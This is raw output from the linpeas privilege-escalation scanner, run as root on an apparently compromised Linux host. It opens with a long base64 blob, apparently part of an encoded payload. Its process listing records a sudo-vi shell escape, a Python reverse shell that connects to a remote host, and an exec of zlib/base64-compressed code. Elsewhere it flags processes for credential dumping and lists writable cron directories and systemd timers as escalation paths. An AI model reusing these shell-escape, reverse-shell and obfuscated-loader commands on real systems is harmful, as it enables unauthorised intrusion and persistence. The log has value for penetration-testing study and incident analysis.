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")))
root       52887  0.0  0.1   7604  4224 pts/3    Ss   09:11   0:00                                          _ /usr/bin/bash -i
root       52902  0.0  0.0   4056  2928 pts/3    S+   09:12   0:00                                              _ /bin/sh ./linpeas.sh
root       56698  0.0  0.0   4056  2072 pts/3    S+   09:22   0:00                                                  _ /bin/sh ./linpeas.sh
root       56700  0.0  0.1  11016  4480 pts/3    R+   09:22   0:00                                                  |   _ ps fauxwww
root       56702  0.0  0.0   4056  2072 pts/3    S+   09:22   0:00                                                  _ /bin/sh ./linpeas.sh

╔══════════╣ Processes with unusual configurations
Process 1 (root) - /sbin/init                                                                                                                                                                                                               
Unusual number of FDs: 135

Process 963 (syslog) - /usr/sbin/rsyslogd -n -iNONE 
SELinux context: rsyslogd (enforce)
  └─ AppArmor profile: rsyslogd (enforce)

Process 5138 (root) - node src/index.js 
SELinux context: docker-default (enforce)
  └─ AppArmor profile: docker-default (enforce)

Process 5260 (root) - python3 code.py 
SELinux context: docker-default (enforce)
  └─ AppArmor profile: docker-default (enforce)


╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory                                                                                                                           
gdm-password Not Found                                                                                                                                                                                                                      
gnome-keyring-daemon Not Found                                                                                                                                                                                                              
lightdm Not Found                                                                                                                                                                                                                           
vsftpd Not Found                                                                                                                                                                                                                            
apache2 Not Found                                                                                                                                                                                                                           
sshd: process found (dump creds from memory as root)                                                                                                                                                                                        
mysql Not Found
postgres Not Found                                                                                                                                                                                                                          
redis-server Not Found                                                                                                                                                                                                                      
mongod Not Found                                                                                                                                                                                                                            
memcached Not Found                                                                                                                                                                                                                         
elasticsearch Not Found                                                                                                                                                                                                                     
jenkins Not Found                                                                                                                                                                                                                           
tomcat Not Found                                                                                                                                                                                                                            
nginx Not Found                                                                                                                                                                                                                             
php-fpm Not Found                                                                                                                                                                                                                           
supervisord Not Found                                                                                                                                                                                                                       
vncserver Not Found                                                                                                                                                                                                                         
xrdp Not Found                                                                                                                                                                                                                              
teamviewer Not Found                                                                                                                                                                                                                        
                                                                                                                                                                                                                                            
╔══════════╣ Opened Files by processes
Process 1 (root) - /sbin/init                                                                                                                                                                                                               
  └─ Has open files:
    └─ /proc/1/mountinfo
    └─ /proc/swaps
    └─ /sys/fs/cgroup/init.scope/memory.pressure
    └─ /dev/kmsg
    └─ /dev/autofs
    └─ pipe:[677]
    └─ /run/dmeventd-server
    └─ /run/dmeventd-client
    └─ /run/initctl
    └─ /sys/fs/cgroup
    └─ /dev/rfkill
    └─ /usr/lib/systemd/systemd-executor
Process 371 (root) - /usr/lib/systemd/systemd-journald 
  └─ Has open files:
    └─ /proc/sys/kernel/hostname
    └─ /sys/fs/cgroup/system.slice/systemd-journald.service/memory.pressure
    └─ /var/log/journal/17c8ea46eabb43848e89bf05e5b2b51f/user-1000@583de5267a6045e49dcbab864f3054aa-000000000000e89f-0006360a0cbbbbda.journal
    └─ /var/log/journal/17c8ea46eabb43848e89bf05e5b2b51f/system.journal
    └─ /var/log/journal/17c8ea46eabb43848e89bf05e5b2b51f/user-1000.journal
    └─ /dev/kmsg
Process 407 (root) - /sbin/multipathd -d -s 
  └─ Has open files:
    └─ /run/multipathd.pid
    └─ /dev/mapper/control
Process 442 (root) - /usr/lib/systemd/systemd-udevd 
  └─ Has open files:
    └─ /usr/lib/udev/hwdb.bin
    └─ /sys/fs/cgroup/system.slice/systemd-udevd.service/memory.pressure
Process 585 (systemd-network) - /usr/lib/systemd/systemd-networkd 
  └─ Has open files:
    └─ /sys/fs/cgroup/system.slice/systemd-networkd.service/memory.pressure
Process 615 (systemd-resolve) - /usr/lib/systemd/systemd-resolved 
  └─ Has open files:
    └─ /sys/fs/cgroup/system.slice/systemd-resolved.service/memory.pressure
    └─ /proc/sys/kernel/hostname
Process 631 (systemd-timesync) - /usr/lib/systemd/systemd-timesyncd 
  └─ Has open files:
    └─ /sys/fs/cgroup/system.slice/systemd-timesyncd.service/memory.pressure
Process 751 (root) - /usr/bin/VGAuthService 
  └─ Has open files:
    └─ pipe:[15720]
Process 756 (root) - /usr/bin/vmtoolsd 
  └─ Has open files:
    └─ /dev/dri/renderD128
    └─ /var/log/vmware-vmsvc-root.log
    └─ pipe:[14014]
Process 904 (root) - /usr/lib/systemd/systemd-logind 
  └─ Has open files:
    └─ /dev/input/event0
    └─ /dev/input/event1
    └─ /dev/tty6
    └─ /run/systemd/inhibit/1.ref
    └─ /run/systemd/inhibit/2.ref
    └─ /run/systemd/sessions/2.ref
    └─ /run/systemd/inhibit/3.ref
    └─ /run/systemd/sessions/150.ref
    └─ /sys/fs/cgroup/system.slice/systemd-logind.service/memory.pressure
    └─ /sys/devices/virtual/tty/tty0/active
Process 911 (root) - /usr/libexec/udisks2/udisksd 
  └─ Has open files:
    └─ /proc/911/mountinfo
    └─ /proc/swaps
Process 952 (root) - /usr/bin/containerd 
  └─ Has open files:
    └─ /run/containerd/io.containerd.runtime.v2.task/moby/d479c6a3d9803f4dd463ebf3a27593caac723bea0c05b433914f5b955ff394fd/log
    └─ /run/containerd/io.containerd.runtime.v2.task/moby/ba2e8eee8c90b4075c8d5dea7d9fcdc05b457183e1af6591ef4abfb2faa514a8/log
    └─ /var/lib/containerd/io.containerd.metadata.v1.bolt/metadb.db
    └─ pipe:[15842]
Process 956 (root) - /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal 
  └─ Has open files:
    └─ /var/log/unattended-upgrades/unattended-upgrades-shutdown.log
    └─ /run/systemd/inhibit/2.ref
Process 963 (syslog) - /usr/sbin/rsyslogd -n -iNONE 
  └─ Has open files:
    └─ /dev/urandom
    └─ /proc/kmsg
    └─ /var/log/syslog
    └─ /var/log/kern.log
    └─ /var/log/auth.log
Process 1004 (root) - /usr/sbin/ModemManager 
  └─ Has open files:
    └─ /run/systemd/inhibit/1.ref
Process 1193 (root) - /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock 
  └─ Has open files:
    └─ /var/lib/docker/volumes/metadatadb.db
    └─ /var/lib/docker/network/files/local-kvdb.db
    └─ net:[4026531840]
    └─ /run/docker/containerd/d479c6a3d9803f4dd463ebf3a27593caac723bea0c05b433914f5b955ff394fd/d479c6a3d9803f4dd463ebf3a27593caac723bea0c05b433914f5b955ff394fd-stdout
    └─ /run/docker/containerd/d479c6a3d9803f4dd463ebf3a27593caac723bea0c05b433914f5b955ff394fd/d479c6a3d9803f4dd463ebf3a27593caac723bea0c05b433914f5b955ff394fd-stderr
    └─ /var/lib/docker/buildkit/containerdmetadb.db
    └─ /var/lib/docker/buildkit/snapshotsdb.db
    └─ /var/lib/docker/buildkit/metadata_v2db.db
    └─ /var/lib/docker/containers/d479c6a3d9803f4dd463ebf3a27593caac723bea0c05b433914f5b955ff394fd/d479c6a3d9803f4dd463ebf3a27593caac723bea0c05b433914f5b955ff394fd-json.log
    └─ /var/lib/docker/buildkit/cachedb.db
    └─ /var/lib/docker/buildkit/historydb.db
    └─ /run/docker/containerd/ba2e8eee8c90b4075c8d5dea7d9fcdc05b457183e1af6591ef4abfb2faa514a8/ba2e8eee8c90b4075c8d5dea7d9fcdc05b457183e1af6591ef4abfb2faa514a8-stdout
    └─ /run/docker/containerd/ba2e8eee8c90b4075c8d5dea7d9fcdc05b457183e1af6591ef4abfb2faa514a8/ba2e8eee8c90b4075c8d5dea7d9fcdc05b457183e1af6591ef4abfb2faa514a8-stderr
    └─ /var/lib/docker/containers/ba2e8eee8c90b4075c8d5dea7d9fcdc05b457183e1af6591ef4abfb2faa514a8/ba2e8eee8c90b4075c8d5dea7d9fcdc05b457183e1af6591ef4abfb2faa514a8-json.log
    └─ pipe:[16002]
Process 1195 (root) - /usr/sbin/cron -f -P 
  └─ Has open files:
    └─ /run/crond.pid
Process 1231 (root) - /bin/login -p --           
  └─ Has open files:
    └─ /dev/tty1
    └─ /run/systemd/sessions/2.ref
Process 1846 (app-admin) - /usr/lib/systemd/systemd --user 
  └─ Has open files:
    └─ /proc/1846/mountinfo
    └─ /proc/swaps
    └─ /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/init.scope/memory.pressure
    └─ /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service
    └─ /usr/lib/systemd/systemd-executor
Process 1848 (app-admin) - (sd-pam) 
  └─ Has open files:
    └─ pipe:[19503]
Process 1859 (app-admin) - -bash 
  └─ Has open files:
    └─ /dev/tty1
Process 2324 (root) - /usr/libexec/upowerd 
  └─ Has open files:
    └─ /run/systemd/inhibit/3.ref
Process 5083 (root) - /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8091 -container-ip 172.17.0.2 -containe
  └─ Has open files:
    └─ pipe:[123476]
Process 5092 (root) - /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 8091 -container-ip 172.17.0.2 -container-por
  └─ Has open files:
    └─ pipe:[123483]
Process 5118 (root) - /usr/bin/containerd-shim-runc-v2 -namespace moby -id d479c6a3d9803f4dd463ebf3a27593caac723bea0c05b43
  └─ Has open files:
    └─ pipe:[123485]
    └─ /run/docker/containerd/d479c6a3d9803f4dd463ebf3a27593caac723bea0c05b433914f5b955ff394fd/d479c6a3d9803f4dd463ebf3a27593caac723bea0c05b433914f5b955ff394fd-stdout
    └─ pipe:[123486]
    └─ /run/docker/containerd/d479c6a3d9803f4dd463ebf3a27593caac723bea0c05b433914f5b955ff394fd/d479c6a3d9803f4dd463ebf3a27593caac723bea0c05b433914f5b955ff394fd-stderr
    └─ /run/containerd/io.containerd.runtime.v2.task/moby/d479c6a3d9803f4dd463ebf3a27593caac723bea0c05b433914f5b955ff394fd/log
    └─ pipe:[130091]
Process 5138 (root) - node src/index.js 
  └─ Has open files:
    └─ pipe:[123485]
    └─ pipe:[128801]
    └─ pipe:[123543]
    └─ /var/lib/hothost/data/process/LOCK
    └─ /var/lib/hothost/data/process/LOG
    └─ pipe:[123486]
    └─ /var/lib/hothost/data/process/000019.log
    └─ /var/lib/hothost/data/process/MANIFEST-000018
    └─ pipe:[123541]
    └─ pipe:[123542]
Process 5215 (root) - /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 23100 -container-ip 172.17.0.3 -contain
  └─ Has open files:
    └─ pipe:[130211]
Process 5221 (root) - /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 23100 -container-ip 172.17.0.3 -container-po
  └─ Has open files:
    └─ pipe:[123602]
Process 5239 (root) - /usr/bin/containerd-shim-runc-v2 -namespace moby -id ba2e8eee8c90b4075c8d5dea7d9fcdc05b457183e1af659
  └─ Has open files:
    └─ pipe:[130213]
    └─ /run/docker/containerd/ba2e8eee8c90b4075c8d5dea7d9fcdc05b457183e1af6591ef4abfb2faa514a8/ba2e8eee8c90b4075c8d5dea7d9fcdc05b457183e1af6591ef4abfb2faa514a8-stdout
    └─ pipe:[130214]
    └─ /run/docker/containerd/ba2e8eee8c90b4075c8d5dea7d9fcdc05b457183e1af6591ef4abfb2faa514a8/ba2e8eee8c90b4075c8d5dea7d9fcdc05b457183e1af6591ef4abfb2faa514a8-stderr
    └─ /run/containerd/io.containerd.runtime.v2.task/moby/ba2e8eee8c90b4075c8d5dea7d9fcdc05b457183e1af6591ef4abfb2faa514a8/log
    └─ pipe:[128854]
Process 5260 (root) - python3 code.py 
  └─ Has open files:
    └─ pipe:[130213]
    └─ pipe:[130214]
Process 5292 (root) - su - 
  └─ Has open files:
    └─ /dev/tty1
Process 5293 (root) - -bash 
  └─ Has open files:
    └─ /dev/tty1
Process 52548 (root) - sshd: app-admin [priv] 
  └─ Has open files:
    └─ /dev/ptmx
    └─ /run/systemd/sessions/150.ref
Process 52650 (app-admin) - sshd: app-admin@pts/0 
  └─ Has open files:
    └─ /dev/ptmx
    └─ /run/systemd/sessions/150.ref
Process 52684 (app-admin) - -bash 
  └─ Has open files:
    └─ /dev/pts/0
Process 52802 (root) - sudo vi -c :!/bin/sh /dev/null 
  └─ Has open files:
    └─ /dev/pts/0
    └─ pipe:[244399]
    └─ /etc/sudoers
    └─ /dev/tty
    └─ /dev/ptmx
Process 52803 (root) - sudo vi -c :!/bin/sh /dev/null 
  └─ Has open files:
    └─ /dev/pts/0
    └─ /dev/pts/1
    └─ pipe:[242941]
    └─ pipe:[244399]
    └─ /etc/sudoers
Process 52804 (root) - vi -c :!/bin/sh /dev/null 
  └─ Has open files:
    └─ /dev/pts/1
Process 52805 (root) - /bin/sh 
  └─ Has open files:
    └─ /dev/pts/1
    └─ /dev/tty
Process 52859 (root) - python3 -c import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("R
  └─ Has open files:
    └─ /dev/ptmx
Process 52860 (root) - /bin/bash 
  └─ Has open files:
    └─ /dev/pts/2
Process 52886 (root) - /usr/bin/python3 -Wignore -c import base64,zlib;exec(zlib.decompress(base64.b64decode("eNqVWW1v40YO/
  └─ Has open files:
    └─ /dev/pts/2
    └─ /dev/ptmx
    └─ pipe:[244669]
Process 52887 (root) - /usr/bin/bash -i 
  └─ Has open files:
    └─ /dev/pts/3

╔══════════╣ Processes with memory-mapped credential files
Process 952 (root) - /usr/bin/containerd                                                                                                                                                                                                    
  └─ Has memory-mapped credential files:
    └─ meta.db
Process 1193 (root) - /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock 
  └─ Has memory-mapped credential files:
    └─ history.db
    └─ cache.db
    └─ metadata_v2.db
    └─ snapshots.db
    └─ local-kv.db
    └─ containerdmeta.db
    └─ metadata.db

╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                                                                                                                                                                   
Proc 5293 with ppid 5292 is run by user root but the ppid user is app-admin                                                                                                                                                                 
Proc 52804 with ppid 52803 is run by user root but the ppid user is app-admin

╔══════════╣ Check for vulnerable cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                                                                                                        
══╣ Cron jobs list                                                                                                                                                                                                                          
/usr/bin/crontab                                                                                                                                                                                                                            
incrontab Not Found
-rw-r--r-- 1 root root    1136 Feb 16 21:04 /etc/crontab                                                                                                                                                                                    

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 May 19 10:31 .
drwxr-xr-x 118 root root 4096 May 19 14:41 ..
-rw-r--r--   1 root root  201 Apr  8  2024 e2scrub_all
-rw-r--r--   1 root root  712 Jan 19  2024 php
-rw-r--r--   1 root root  102 Feb 16 21:04 .placeholder
-rw-r--r--   1 root root  396 Feb 16 21:04 sysstat

/etc/cron.daily:
total 40
drwxr-xr-x   2 root root 4096 May  1 13:40 .
drwxr-xr-x 118 root root 4096 May 19 14:41 ..
-rwxr-xr-x   1 root root  376 Oct 26  2024 apport
-rwxr-xr-x   1 root root 1478 Mar 22  2024 apt-compat
-rwxr-xr-x   1 root root  123 Feb  5  2024 dpkg
-rwxr-xr-x   1 root root  377 Feb 16 21:04 logrotate
-rwxr-xr-x   1 root root 1395 Feb 16 21:04 man-db
-rw-r--r--   1 root root  102 Feb 16 21:04 .placeholder
-rwxr-xr-x   1 root root  652 Jul 31  2023 plocate
-rwxr-xr-x   1 root root  518 Feb 16 21:04 sysstat

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Feb 16 21:04 .
drwxr-xr-x 118 root root 4096 May 19 14:41 ..
-rw-r--r--   1 root root  102 Feb 16 21:04 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Feb 16 21:04 .
drwxr-xr-x 118 root root 4096 May 19 14:41 ..
-rw-r--r--   1 root root  102 Feb 16 21:04 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x   2 root root 4096 Feb 16 21:04 .
drwxr-xr-x 118 root root 4096 May 19 14:41 ..
-rwxr-xr-x   1 root root 1055 Feb 16 21:04 man-db
-rw-r--r--   1 root root  102 Feb 16 21:04 .placeholder

/etc/cron.yearly:
total 12
drwxr-xr-x   2 root root 4096 Feb 16 21:04 .
drwxr-xr-x 118 root root 4096 May 19 14:41 ..
-rw-r--r--   1 root root  102 Feb 16 21:04 .placeholder

/var/spool/cron/crontabs:
total 8
drwx-wx--T 2 root crontab 4096 Feb 16 21:04 .
drwxr-xr-x 3 root root    4096 Feb 16 21:04 ..

SHELL=/bin/sh

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/manacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/manacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/manacron || { cd / && run-parts --report /etc/cron.monthly; }

══╣ Checking for specific cron jobs vulnerabilities
Checking cron directories...                                                                                                                                                                                                                
Writable cron directory: /etc/cron.d
Writable cron directory: /etc/cron.daily
Writable cron directory: /etc/cron.hourly
Writable cron directory: /etc/cron.monthly
Writable cron directory: /etc/cron.weekly
Writable cron directory: /var/spool/cron/crontabs

╔══════════╣ System timers
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                                                                                                                    
══╣ Active timers:                                                                                                                                                                                                                          
NEXT                             LEFT LAST                              PASSED UNIT                           ACTIVATES                                                                                                                     
Sat 2025-07-19 09:30:00 UTC      7min Sat 2025-07-19 09:20:15 UTC 2min 10s ago sysstat-collect.timer          sysstat-collect.service
Sat 2025-07-19 09:39:00 UTC     16min Sat 2025-07-19 09:09:14 UTC    13min ago phpsessionclean.timer          phpsessionclean.service
Sat 2025-07-19 09:49:53 UTC     27min Sat 2025-07-19 08:58:04 UTC    24min ago fwupd-refresh.timer            fwupd-refresh.service
Sat 2025-07-19 16:55:21 UTC        7h Mon 2025-05-26 13:37:51 UTC      16h ago update-notifier-download.timer update-notifier-download.service
Sat 2025-07-19 17:05:20 UTC        7h Fri 2025-05-30 17:40:02 UTC      16h ago systemd-tmpfiles-clean.timer   systemd-tmpfiles-clean.service
Sat 2025-07-19 19:19:06 UTC        9h Sat 2025-07-19 07:20:09 UTC  2h 2min ago apt-daily.timer                apt-daily.service
Sat 2025-07-19 23:25:04 UTC       14h Sat 2025-07-19 07:20:09 UTC  2h 2min ago motd-news.timer                motd-news.service
Sat 2025-07-19 23:39:02 UTC       14h Mon 2025-05-19 10:31:01 UTC            - update-notifier-motd.timer     update-notifier-motd.service
Sun 2025-07-20 00:00:00 UTC       14h Sat 2025-07-19 07:20:09 UTC  2h 2min ago dpkg-db-backup.timer           dpkg-db-backup.service
Sun 2025-07-20 00:00:00 UTC       14h Sat 2025-07-19 07:20:09 UTC  2h 2min ago logrotate.timer                logrotate.service
Sun 2025-07-20 00:07:00 UTC       14h Sat 2025-07-19 07:20:09 UTC  2h 2min ago sysstat-summary.timer          sysstat-summary.service
Sun 2025-07-20 01:48:49 UTC       16h Sat 2025-07-19 07:20:09 UTC  2h 2min ago man-db.timer                   man-db.service
Sun 2025-07-20 03:10:46 UTC       17h Sat 2025-07-19 07:20:09 UTC  2h 2min ago e2scrub_all.timer              e2scrub_all.service
Sun 2025-07-20 06:33:50 UTC       21h Sat 2025-07-19 07:20:09 UTC  2h 2min ago apt-daily-upgrade.timer        apt-daily-upgrade.service
Sun 2025-07-20 08:34:50 UTC       23h Sat 2025-07-19 07:20:09 UTC  2h 2min ago plocate-updatedb.timer         plocate-updatedb.service
Mon 2025-07-21 01:36:45 UTC 1 day 16h Sat 2025-07-19 07:20:09 UTC  2h 2min ago fstrim.timer                   fstrim.service
-                                   - -                                      - apport-autoreport.timer        apport-autoreport.service
-                                   - -                                      - snapd.snap-repair.timer        snapd.snap-repair.service
-                                   - -                                      - ua-timer.timer                 ua-timer.service
══╣ Disabled timers:
Potential privilege escalation in timer file: /usr/lib/systemd/system/systemd-sysupdate-reboot.timer                                                                                                                                        
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/systemd-sysupdate.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/xfs_scrub_all.timer
  └─ WRITABLE_FILE: Timer file is writable
══╣ Additional timer files:
Potential privilege escalation in timer file: /etc/systemd/system/mdmonitor.service.wants/mdcheck_continue.timer                                                                                                                            
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/mdcheck_continue.timer
Potential privilege escalation in timer file: /etc/systemd/system/mdmonitor.service.wants/mdcheck_start.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/mdcheck_start.timer
Potential privilege escalation in timer file: /etc/systemd/system/mdmonitor.service.wants/mdmonitor-oneshot.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/mdmonitor-oneshot.timer
Potential privilege escalation in timer file: /etc/systemd/system/sysstat.service.wants/sysstat-collect.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/sysstat-collect.timer
Potential privilege escalation in timer file: /etc/systemd/system/sysstat.service.wants/sysstat-summary.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/sysstat-summary.timer
Potential privilege escalation in timer file: /etc/systemd/system/timers.target.wants/apport-autoreport.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/apport-autoreport.timer
Potential privilege escalation in timer file: /etc/systemd/system/timers.target.wants/apt-daily.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/apt-daily.timer
Potential privilege escalation in timer file: /etc/systemd/system/timers.target.wants/apt-daily-upgrade.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/apt-daily-upgrade.timer
Potential privilege escalation in timer file: /etc/systemd/system/timers.target.wants/dpkg-db-backup.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/dpkg-db-backup.timer
Potential privilege escalation in timer file: /etc/systemd/system/timers.target.wants/e2scrub_all.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/e2scrub_all.timer
Potential privilege escalation in timer file: /etc/systemd/system/timers.target.wants/fstrim.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/fstrim.timer
Potential privilege escalation in timer file: /etc/systemd/system/timers.target.wants/fwupd-refresh.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/fwupd-refresh.timer
Potential privilege escalation in timer file: /etc/systemd/system/timers.target.wants/logrotate.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/logrotate.timer
Potential privilege escalation in timer file: /etc/systemd/system/timers.target.wants/man-db.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/man-db.timer
Potential privilege escalation in timer file: /etc/systemd/system/timers.target.wants/motd-news.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/motd-news.timer
Potential privilege escalation in timer file: /etc/systemd/system/timers.target.wants/phpsessionclean.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/phpsessionclean.timer
Potential privilege escalation in timer file: /etc/systemd/system/timers.target.wants/plocate-updatedb.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/plocate-updatedb.timer
Potential privilege escalation in timer file: /etc/systemd/system/timers.target.wants/snapd.snap-repair.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/snapd.snap-repair.timer
Potential privilege escalation in timer file: /etc/systemd/system/timers.target.wants/ua-timer.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/ua-timer.timer
Potential privilege escalation in timer file: /etc/systemd/system/timers.target.wants/update-notifier-download.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/update-notifier-download.timer
Potential privilege escalation in timer file: /etc/systemd/system/timers.target.wants/update-notifier-motd.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/update-notifier-motd.timer
Potential privilege escalation in timer file: /etc/systemd/user/timers.target.wants/launchpadlib-cache-clean.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/user/launchpadlib-cache-clean.timer
Potential privilege escalation in timer file: /usr/lib/systemd/system/apport-autoreport.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/apt-daily.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/apt-daily-upgrade.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/dpkg-db-backup.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/e2scrub_all.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/fstrim.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/fwupd-refresh.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/logrotate.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/man-db.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/mdadm-last-resort@.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/mdcheck_continue.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/mdcheck_start.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/mdmonitor-oneshot.timer
  └─ WRITABLE_FILE: Timer file is writable
